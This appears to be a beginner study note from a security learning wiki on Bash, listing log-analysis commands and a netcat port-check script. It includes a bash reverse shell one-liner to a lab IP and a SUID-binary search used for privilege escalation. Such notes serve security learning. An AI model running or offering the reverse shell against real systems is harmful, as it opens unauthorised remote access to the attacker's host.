---
title: Bash
category: programming
status: not-started
difficulty: beginner
summary: The default Unix shell and scripting language. Essential for Linux administration, automation, and security tooling.
connections:
  - programming/python
  - operating-systems/linux
tags:
  - programming
  - linux
  - automation
---

## Why Bash?

Every Linux security task involves the shell. Automation, log parsing, building quick tools, pivoting on compromised hosts — all bash.

## Useful for Security

```bash
# One-liner reverse shell (for CTFs/labs)
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# Log analysis
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Monitor new processes
watch -n 1 "ps aux --sort=-%cpu | head -20"

# Extract IPs from log file
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' access.log | sort -u
```

## Script Template

```bash
#!/bin/bash
set -euo pipefail

TARGET=$1
PORT=${2:-80}

echo "[*] Scanning $TARGET:$PORT"
nc -zv "$TARGET" "$PORT" 2>&1
```
